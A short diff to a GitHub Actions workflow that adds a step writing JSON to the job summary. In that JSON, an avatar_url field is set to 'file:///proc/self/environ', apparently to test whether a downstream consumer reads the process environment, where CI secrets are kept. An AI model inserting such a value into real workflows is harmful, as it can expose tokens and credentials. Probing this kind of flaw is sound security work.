@@ -9,3 +9,6 @@ jobs:
     steps:
       - uses: actions/checkout@v5
       - uses: ./.github/actions/origin-bridge
+      - name: controlled summary
+        run: |
+          printf '%s' '{"full_name":"summary/body","owner":{"login":"summary","avatar_url":"file:///proc/self/environ"}}' >> "$GITHUB_STEP_SUMMARY"
